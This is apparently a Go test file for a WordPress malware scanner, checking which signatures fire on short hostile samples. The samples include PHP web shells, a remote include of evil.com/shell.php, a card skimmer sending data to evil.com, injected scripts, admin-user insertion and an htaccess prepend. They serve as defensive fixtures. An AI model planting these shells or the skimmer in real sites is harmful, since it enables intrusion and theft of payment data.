package wordpress

import (
	"context"
	"strings"
	"testing"

	"github.com/IvanShishkin/houndoom/internal/signatures"
	"github.com/IvanShishkin/houndoom/pkg/models"
)

func newTestDetector(level models.SignatureLevel) *WordPressDetector {
	db := models.NewSignatureDatabase()
	matcher := signatures.NewMatcher(db)
	return NewWordPressDetector(matcher, level)
}

func hasSignatureID(findings []*models.Finding, sigID string) bool {
	for _, f := range findings {
		if f.SignatureID == sigID {
			return true
		}
	}
	return false
}

// --- Category 1: Backdoors & Web Shells ---

func TestDetectBackdoors_FakeWPFile(t *testing.T) {
	detector := newTestDetector(models.LevelBasic)

	tests := []struct {
		name      string
		path      string
		content   string
		expectHit bool
		sigID     string
	}{
		{
			name:      "fake wp-xmlrpc.php",
			path:      "/var/www/html/wp-xmlrpc.php",
			content:   `<?php eval(base64_decode($_POST['cmd'])); ?>`,
			expectHit: true,
			sigID:     "WP-DETECT-FAKEFILE",
		},
		{
			name:      "fake wp-cron-jobs.php",
			path:      "/var/www/html/wp-cron-jobs.php",
			content:   `<?php system($_GET['x']); ?>`,
			expectHit: true,
			sigID:     "WP-DETECT-FAKEFILE",
		},
		{
			name:      "legitimate xmlrpc.php should not match",
			path:      "/var/www/html/xmlrpc.php",
			content:   `<?php require_once('./wp-load.php');`,
			expectHit: false,
			sigID:     "WP-DETECT-FAKEFILE",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			file := &models.File{
				Path:      tt.path,
				Extension: "php",
				Content:   []byte(tt.content),
			}
			findings, err := detector.Detect(context.Background(), file)
			if err != nil {
				t.Fatalf("Detect error: %v", err)
			}

			found := hasSignatureID(findings, tt.sigID)
			if found != tt.expectHit {
				t.Errorf("expected %s hit=%v, got=%v (total findings: %d)",
					tt.sigID, tt.expectHit, found, len(findings))
				for _, f := range findings {
					t.Logf("  Found: %s - %s", f.SignatureID, f.Description)
				}
			}
		})
	}
}

func TestDetectBackdoors_EvalInTheme(t *testing.T) {
	detector := newTestDetector(models.LevelBasic)

	tests := []struct {
		name      string
		path      string
		content   string
		expectHit bool
	}{
		{
			name:      "eval base64 in functions.php",
			path:      "/var/www/html/wp-content/themes/flavor/functions.php",
			content:   `<?php eval(base64_decode("ZXZhbCgkX1BPU1RbJ3gnXSk=")); ?>`,
			expectHit: true,
		},
		{
			name:      "eval gzinflate in header.php",
			path:      "/var/www/html/wp-content/themes/flavor/header.php",
			content:   `<?php eval(gzinflate(base64_decode("s0ks..."))); ?>`,
			expectHit: true,
		},
		{
			name:      "normal functions.php should not match",
			path:      "/var/www/html/wp-content/themes/flavor/functions.php",
			content:   `<?php add_action('after_setup_theme', function() { add_theme_support('post-thumbnails'); });`,
			expectHit: false,
		},
		{
			name:      "eval in non-theme file should not match this check",
			path:      "/var/www/html/wp-content/plugins/myplugin/main.php",
			content:   `<?php eval(base64_decode("test")); ?>`,
			expectHit: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			file := &models.File{
				Path:      tt.path,
				Extension: "php",
				Content:   []byte(tt.content),
			}
			findings, err := detector.Detect(context.Background(), file)
			if err != nil {
				t.Fatalf("Detect error: %v", err)
			}

			found := hasSignatureID(findings, "WP-DETECT-EVALTHEME")
			if found != tt.expectHit {
				t.Errorf("expected EVALTHEME hit=%v, got=%v", tt.expectHit, found)
			}
		})
	}
}

func TestDetectBackdoors_RemoteInclusion(t *testing.T) {
	detector := newTestDetector(models.LevelBasic)

	file := &models.File{
		Path:      "/var/www/html/wp-config.php",
		Extension: "php",
		Content:   []byte(`<?php include("https://evil.com/shell.php"); ?>`),
	}
	findings, err := detector.Detect(context.Background(), file)
	if err != nil {
		t.Fatalf("Detect error: %v", err)
	}

	if !hasSignatureID(findings, "WP-DETECT-RFI") {
		t.Error("Expected WP-DETECT-RFI for remote file inclusion")
	}
}

func TestDetectBackdoors_FakePlugin(t *testing.T) {
	detector := newTestDetector(models.LevelBasic)

	tests := []struct {
		name      string
		content   string
		expectSig string
	}{
		{
			name: "fake plugin with system()",
			content: `<?php
/*
Plugin Name: WP Helper
Description: Helps with WordPress
*/
system($_GET['cmd']);
?>`,
			expectSig: "WP-DETECT-FAKEPLUGIN-SHELL",
		},
		{
			name: "fake plugin with eval()",
			content: `<?php
/*
Plugin Name: WP Helper
Description: Helps with WordPress
*/
eval($_POST['code']);
?>`,
			expectSig: "WP-DETECT-FAKEPLUGIN-EVAL",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			file := &models.File{
				Path:      "/var/www/html/wp-content/plugins/wp-helper/wp-helper.php",
				Extension: "php",
				Content:   []byte(tt.content),
			}
			findings, err := detector.Detect(context.Background(), file)
			if err != nil {
				t.Fatalf("Detect error: %v", err)
			}

			if !hasSignatureID(findings, tt.expectSig) {
				t.Errorf("Expected %s finding", tt.expectSig)
				for _, f := range findings {
					t.Logf("  Found: %s - %s", f.SignatureID, f.Description)
				}
			}
		})
	}
}

// --- Category 2: Dangerous API Usage ---

func TestDetectDangerousAPI(t *testing.T) {
	detector := newTestDetector(models.LevelExpert)

	tests := []struct {
		name      string
		content   string
		expectSig string
		expectHit bool
	}{
		{
			name:      "SQL injection via wpdb->query",
			content:   `<?php $wpdb->query("DELETE FROM wp_users WHERE id=" . $_GET['id']); ?>`,
			expectSig: "WP-DETECT-SQLI",
			expectHit: true,
		},
		{
			name:      "SSRF via wp_remote_get",
			content:   `<?php $resp = wp_remote_get($_POST['url']); ?>`,
			expectSig: "WP-DETECT-SSRF",
			expectHit: true,
		},
		{
			name:      "unsafe update_option",
			content:   `<?php update_option('my_option', $_POST['value']); ?>`,
			expectSig: "WP-DETECT-UNSAFE-OPTION",
			expectHit: true,
		},
		{
			name:      "call_user_func with user input",
			content:   `<?php call_user_func($_GET['func'], 'arg'); ?>`,
			expectSig: "WP-DETECT-CALLUSERFUNC",
			expectHit: true,
		},
		{
			name:      "safe wpdb->prepare should not match",
			content:   `<?php $wpdb->query($wpdb->prepare("DELETE FROM wp_users WHERE id = %d", $id)); ?>`,
			expectSig: "WP-DETECT-SQLI",
			expectHit: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			file := &models.File{
				Path:      "/var/www/html/wp-content/plugins/myplugin/main.php",
				Extension: "php",
				Content:   []byte(tt.content),
			}
			findings, err := detector.Detect(context.Background(), file)
			if err != nil {
				t.Fatalf("Detect error: %v", err)
			}

			found := hasSignatureID(findings, tt.expectSig)
			if found != tt.expectHit {
				t.Errorf("expected %s hit=%v, got=%v", tt.expectSig, tt.expectHit, found)
				for _, f := range findings {
					t.Logf("  Found: %s - %s", f.SignatureID, f.Description)
				}
			}
		})
	}
}

func TestDetectDangerousAPI_CoreFileSkipped(t *testing.T) {
	detector := newTestDetector(models.LevelExpert)

	// Core file with legitimate wp_remote_get usage should be skipped
	file := &models.File{
		Path:      "/var/www/html/wp-includes/http.php",
		Extension: "php",
		Content:   []byte(`<?php function wp_remote_get($_GET['url']) { /* core impl */ } ?>`),
	}
	findings, err := detector.Detect(context.Background(), file)
	if err != nil {
		t.Fatalf("Detect error: %v", err)
	}

	if hasSignatureID(findings, "WP-DETECT-SSRF") {
		t.Error("Core file should not trigger API abuse detection")
	}
}

// --- Category 3: Authentication & Authorization Bypass ---

func TestDetectAuthBypass(t *testing.T) {
	detector := newTestDetector(models.LevelExpert)

	tests := []struct {
		name      string
		content   string
		expectSig string
		expectHit bool
	}{
		{
			name:      "direct auth cookie set",
			content:   `<?php wp_set_auth_cookie($user_id, true); ?>`,
			expectSig: "WP-DETECT-AUTHCOOKIE",
			expectHit: true,
		},
		{
			name:      "admin user insertion",
			content:   `<?php wp_insert_user(array('user_login' => 'admin2', 'role' => 'administrator', 'user_pass' => 'pass123')); ?>`,
			expectSig: "WP-DETECT-ADMININSERT",
			expectHit: true,
		},
		{
			name:      "role escalation to administrator",
			content:   `<?php $user = get_user_by('login', 'victim'); $user->set_role('administrator'); ?>`,
			expectSig: "WP-DETECT-ROLEESCALATION",
			expectHit: true,
		},
		{
			name:      "capability escalation",
			content:   `<?php $user->add_cap('manage_options'); ?>`,
			expectSig: "WP-DETECT-CAPESCALATION",
			expectHit: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			file := &models.File{
				Path:      "/var/www/html/wp-content/plugins/evil/evil.php",
				Extension: "php",
				Content:   []byte(tt.content),
			}
			findings, err := detector.Detect(context.Background(), file)
			if err != nil {
				t.Fatalf("Detect error: %v", err)
			}

			found := hasSignatureID(findings, tt.expectSig)
			if found != tt.expectHit {
				t.Errorf("expected %s hit=%v, got=%v", tt.expectSig, tt.expectHit, found)
				for _, f := range findings {
					t.Logf("  Found: %s - %s", f.SignatureID, f.Description)
				}
			}
		})
	}
}

func TestDetectAuthBypass_NotTriggeredAtBasicLevel(t *testing.T) {
	detector := newTestDetector(models.LevelBasic)

	file := &models.File{
		Path:      "/var/www/html/wp-content/plugins/evil/evil.php",
		Extension: "php",
		Content:   []byte(`<?php wp_set_auth_cookie($user_id, true); ?>`),
	}
	findings, err := detector.Detect(context.Background(), file)
	if err != nil {
		t.Fatalf("Detect error: %v", err)
	}

	if hasSignatureID(findings, "WP-DETECT-AUTHCOOKIE") {
		t.Error("Auth bypass detection should not trigger at Basic level")
	}
}

func TestDetectAuthBypass_CoreFileSkipped(t *testing.T) {
	detector := newTestDetector(models.LevelExpert)

	// pluggable.php legitimately sets auth cookies
	file := &models.File{
		Path:      "/var/www/html/wp-includes/pluggable.php",
		Extension: "php",
		Content:   []byte(`<?php function wp_set_auth_cookie($user_id, $remember = false) { /* core */ } ?>`),
	}
	findings, err := detector.Detect(context.Background(), file)
	if err != nil {
		t.Fatalf("Detect error: %v", err)
	}

	if hasSignatureID(findings, "WP-DETECT-AUTHCOOKIE") {
		t.Error("Core file wp-includes/pluggable.php should not trigger auth bypass detection")
	}
}

// --- Category 4: Malicious Hooks & Filters ---

func TestDetectMaliciousHooks(t *testing.T) {
	detector := newTestDetector(models.LevelExpert)

	tests := []struct {
		name      string
		content   string
		expectSig string
		expectHit bool
	}{
		{
			name: "init hook with eval",
			content: `<?php add_action('init', function() {
				eval($_POST['x']);
			}); ?>`,
			expectSig: "WP-DETECT-INITRCE",
			expectHit: true,
		},
		{
			name: "wp_head hook with base64_decode",
			content: `<?php add_action('wp_head', function() {
				echo base64_decode("PHNjcmlwdD4=");
			}); ?>`,
			expectSig: "WP-DETECT-HOOKINJECTION",
			expectHit: true,
		},
		{
			name: "the_content filter with script injection",
			content: `<?php add_filter('the_content', function($c) {
				return $c . '<script src="https://evil.com/inject.js"></script>';
			}); ?>`,
			expectSig: "WP-DETECT-CONTENTFILTER",
			expectHit: true,
		},
		{
			name:      "scheduled event",
			content:   `<?php wp_schedule_event(time(), 'hourly', 'my_malicious_cron'); ?>`,
			expectSig: "WP-DETECT-SCHEDEVENT",
			expectHit: true,
		},
		{
			name: "normal init hook should not match RCE pattern",
			content: `<?php add_action('init', function() {
				register_post_type('my_post_type');
			}); ?>`,
			expectSig: "WP-DETECT-INITRCE",
			expectHit: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			file := &models.File{
				Path:      "/var/www/html/wp-content/plugins/myplugin/main.php",
				Extension: "php",
				Content:   []byte(tt.content),
			}
			findings, err := detector.Detect(context.Background(), file)
			if err != nil {
				t.Fatalf("Detect error: %v", err)
			}

			found := hasSignatureID(findings, tt.expectSig)
			if found != tt.expectHit {
				t.Errorf("expected %s hit=%v, got=%v", tt.expectSig, tt.expectHit, found)
				for _, f := range findings {
					t.Logf("  Found: %s - %s", f.SignatureID, f.Description)
				}
			}
		})
	}
}

// --- Category 5: WordPress Structure Anomalies ---

func TestDetectStructureAnomalies(t *testing.T) {
	detector := newTestDetector(models.LevelBasic)

	tests := []struct {
		name      string
		path      string
		extension string
		content   string
		expectSig string
		expectHit bool
	}{
		{
			name:      "PHP in uploads directory",
			path:      "/var/www/html/wp-content/uploads/2024/01/shell.php",
			extension: "php",
			content:   `<?php echo "hello"; ?>`,
			expectSig: "WP-STRUCTURE-001",
			expectHit: true,
		},
		{
			name:      "image in uploads is fine",
			path:      "/var/www/html/wp-content/uploads/2024/01/photo.jpg",
			extension: "jpg",
			content:   "binary image data",
			expectSig: "WP-STRUCTURE-001",
			expectHit: false,
		},
		{
			name:      "suspicious htaccess in wp-admin",
			path:      "/var/www/html/wp-admin/.htaccess",
			extension: "htaccess",
			content:   "php_value auto_prepend_file /tmp/evil.php",
			expectSig: "WP-STRUCTURE-002",
			expectHit: true,
		},
		{
			name:      "normal htaccess in root",
			path:      "/var/www/html/.htaccess",
			extension: "htaccess",
			content:   "RewriteEngine On\nRewriteBase /",
			expectSig: "WP-STRUCTURE-002",
			expectHit: false,
		},
		{
			name:      "hidden PHP in themes",
			path:      "/var/www/html/wp-content/themes/flavor/.backdoor.php",
			extension: "php",
			content:   `<?php system($_GET['x']); ?>`,
			expectSig: "WP-STRUCTURE-003",
			expectHit: true,
		},
		{
			name:      "hidden PHP in plugins",
			path:      "/var/www/html/wp-content/plugins/myplugin/.hidden.php",
			extension: "php",
			content:   `<?php eval($_POST['x']); ?>`,
			expectSig: "WP-STRUCTURE-003",
			expectHit: true,
		},
		{
			name:      "normal PHP in themes should not match hidden check",
			path:      "/var/www/html/wp-content/themes/flavor/functions.php",
			extension: "php",
			content:   `<?php // normal theme file`,
			expectSig: "WP-STRUCTURE-003",
			expectHit: false,
		},
		{
			name:      "fake core file in wp-includes",
			path:      "/var/www/html/wp-includes/wp-vcd.php",
			extension: "php",
			content:   `<?php // malware`,
			expectSig: "WP-STRUCTURE-004",
			expectHit: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			file := &models.File{
				Path:      tt.path,
				Name:      tt.path[strings.LastIndex(tt.path, "/")+1:],
				Extension: tt.extension,
				Content:   []byte(tt.content),
			}
			findings, err := detector.Detect(context.Background(), file)
			if err != nil {
				t.Fatalf("Detect error: %v", err)
			}

			found := hasSignatureID(findings, tt.expectSig)
			if found != tt.expectHit {
				t.Errorf("expected %s hit=%v, got=%v", tt.expectSig, tt.expectHit, found)
				for _, f := range findings {
					t.Logf("  Found: %s - %s", f.SignatureID, f.Description)
				}
			}
		})
	}
}

// --- Category 6: Known Malware Patterns ---

func TestDetectKnownMalware(t *testing.T) {
	detector := newTestDetector(models.LevelExpert)

	tests := []struct {
		name      string
		content   string
		expectSig string
		expectHit bool
	}{
		{
			name:      "wp-vcd WP_CD_CODE marker",
			content:   `<?php if (defined('WP_CD_CODE')) return; define('WP_CD_CODE', true); ?>`,
			expectSig: "WP-DETECT-WPVCD",
			expectHit: true,
		},
		{
			name:      "coinhive miner",
			content:   `<script src="https://coinhive.com/lib/coinhive.min.js"></script>`,
			expectSig: "WP-DETECT-MINER",
			expectHit: true,
		},
		{
			name:      "credit card skimmer",
			content:   `var ccnum = document.querySelector('[name=card_number]').value; navigator.sendBeacon("https://evil.com/collect", ccnum);`,
			expectSig: "WP-DETECT-SKIMMER",
			expectHit: true,
		},
		{
			name:      "pharma SEO spam",
			content:   `<div style="display:none">Buy cheap viagra</div><a href="http://pharma.example.com">pharmacy</a>`,
			expectSig: "WP-DETECT-PHARMA",
			expectHit: true,
		},
		{
			name:      "malicious redirect to .tk domain",
			content:   `<?php header("Location: https://evil.tk/redir"); ?>`,
			expectSig: "WP-DETECT-REDIRECT",
			expectHit: true,
		},
		{
			name:      "siteurl manipulation",
			content:   `<?php update_option('siteurl', 'https://evil.com'); ?>`,
			expectSig: "WP-DETECT-SITEURL",
			expectHit: true,
		},
		{
			name:      "user-agent cloaking for googlebot",
			content:   `<?php if (strpos($_SERVER['HTTP_USER_AGENT'], 'googlebot') !== false) { echo $spam_content; } ?>`,
			expectSig: "WP-DETECT-CLOAKING",
			expectHit: true,
		},
		{
			name:      "clean file should not trigger",
			content:   `<?php echo "Hello World"; get_header(); the_content(); get_footer(); ?>`,
			expectSig: "WP-DETECT-WPVCD",
			expectHit: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			file := &models.File{
				Path:      "/var/www/html/wp-content/themes/flavor/functions.php",
				Extension: "php",
				Content:   []byte(tt.content),
			}
			findings, err := detector.Detect(context.Background(), file)
			if err != nil {
				t.Fatalf("Detect error: %v", err)
			}

			found := hasSignatureID(findings, tt.expectSig)
			if found != tt.expectHit {
				t.Errorf("expected %s hit=%v, got=%v", tt.expectSig, tt.expectHit, found)
				for _, f := range findings {
					t.Logf("  Found: %s - %s", f.SignatureID, f.Description)
				}
			}
		})
	}
}

// --- Security Plugin Whitelist ---

func TestSecurityPluginWhitelist(t *testing.T) {
	detector := newTestDetector(models.LevelExpert)

	// Wordfence scanner file with patterns should not trigger
	file := &models.File{
		Path:      "/var/www/html/wp-content/plugins/wordfence/lib/scanner.php",
		Extension: "php",
		Content:   []byte(`<?php // Pattern detection: eval(base64_decode, wp_set_auth_cookie, $wpdb->query($_GET['id']`),
	}
	findings, err := detector.Detect(context.Background(), file)
	if err != nil {
		t.Fatalf("Detect error: %v", err)
	}

	for _, f := range findings {
		if f.SignatureID == "WP-DETECT-SQLI" ||
			f.SignatureID == "WP-DETECT-AUTHCOOKIE" {
			t.Errorf("Security plugin file should not trigger %s", f.SignatureID)
		}
	}
}

// --- Core File Whitelist ---

func TestCoreFileWhitelist(t *testing.T) {
	detector := newTestDetector(models.LevelExpert)

	coreTests := []struct {
		path string
		desc string
	}{
		{"/var/www/html/wp-includes/pluggable.php", "pluggable.php"},
		{"/var/www/html/wp-includes/user.php", "user.php"},
		{"/var/www/html/wp-admin/includes/user.php", "admin user.php"},
		{"/var/www/html/wp-includes/cron.php", "cron.php"},
	}

	for _, tt := range coreTests {
		t.Run(tt.desc, func(t *testing.T) {
			if !detector.isCoreFile(tt.path) {
				t.Errorf("isCoreFile(%s) = false, want true", tt.path)
			}
		})
	}

	// Non-core files
	nonCoreTests := []string{
		"/var/www/html/wp-content/plugins/myplugin/main.php",
		"/var/www/html/wp-content/themes/mytheme/functions.php",
		"/var/www/html/custom.php",
	}
	for _, path := range nonCoreTests {
		if detector.isCoreFile(path) {
			t.Errorf("isCoreFile(%s) = true, want false", path)
		}
	}
}

// --- Signature Level Tests ---

func TestSignatureLevelFiltering(t *testing.T) {
	// Basic level should not detect Expert/Paranoid-level patterns
	basicDetector := newTestDetector(models.LevelBasic)

	// SSRF detection is Expert-level
	file := &models.File{
		Path:      "/var/www/html/wp-content/plugins/myplugin/main.php",
		Extension: "php",
		Content:   []byte(`<?php $resp = wp_remote_get($_POST['url']); ?>`),
	}
	findings, err := basicDetector.Detect(context.Background(), file)
	if err != nil {
		t.Fatalf("Detect error: %v", err)
	}

	if hasSignatureID(findings, "WP-DETECT-SSRF") {
		t.Error("SSRF detection should not trigger at Basic level")
	}

	// Expert level should detect it
	expertDetector := newTestDetector(models.LevelExpert)
	findings, err = expertDetector.Detect(context.Background(), file)
	if err != nil {
		t.Fatalf("Detect error: %v", err)
	}

	if !hasSignatureID(findings, "WP-DETECT-SSRF") {
		t.Error("SSRF detection should trigger at Expert level")
	}
}

// --- Finding Quality Tests ---

func TestFindingMetadata(t *testing.T) {
	detector := newTestDetector(models.LevelBasic)

	file := &models.File{
		Path:      "/var/www/html/wp-content/uploads/2024/01/shell.php",
		Extension: "php",
		Content:   []byte(`<?php eval(base64_decode("test")); ?>`),
	}
	findings, err := detector.Detect(context.Background(), file)
	if err != nil {
		t.Fatalf("Detect error: %v", err)
	}

	if len(findings) == 0 {
		t.Fatal("Expected at least one finding")
	}

	// Check that findings have proper metadata
	for _, f := range findings {
		if f.RiskScore == nil {
			t.Errorf("Finding %s has nil RiskScore", f.SignatureID)
		}
		if f.Metadata == nil {
			t.Errorf("Finding %s has nil Metadata", f.SignatureID)
		}
		if f.Metadata["cms"] != "wordpress" {
			t.Errorf("Finding %s missing cms=wordpress metadata", f.SignatureID)
		}
		if f.Timestamp.IsZero() {
			t.Errorf("Finding %s has zero timestamp", f.SignatureID)
		}
	}
}

// --- Combined Detection Test ---

func TestCombinedDetection_MaliciousFile(t *testing.T) {
	detector := newTestDetector(models.LevelExpert)

	// A file that should trigger multiple detection categories
	maliciousContent := `<?php
/*
Plugin Name: WP Helper
*/
eval(base64_decode($_POST['cmd']));
$wpdb->query("DELETE FROM wp_users WHERE id=" . $_GET['id']);
wp_set_auth_cookie(1, true);
if (defined('WP_CD_CODE')) return;
header("Location: https://evil.tk/redir");
`

	file := &models.File{
		Path:      "/var/www/html/wp-content/plugins/wp-helper/wp-helper.php",
		Extension: "php",
		Content:   []byte(maliciousContent),
	}
	findings, err := detector.Detect(context.Background(), file)
	if err != nil {
		t.Fatalf("Detect error: %v", err)
	}

	// Should trigger multiple categories
	if len(findings) < 3 {
		t.Errorf("Expected at least 3 findings for malicious file, got %d", len(findings))
		for _, f := range findings {
			t.Logf("  Found: %s - %s", f.SignatureID, f.Description)
		}
	}

	// Verify critical severity findings exist
	hasCritical := false
	for _, f := range findings {
		if f.Severity == models.SeverityCritical {
			hasCritical = true
			break
		}
	}
	if !hasCritical {
		t.Error("Expected at least one critical severity finding")
	}
}
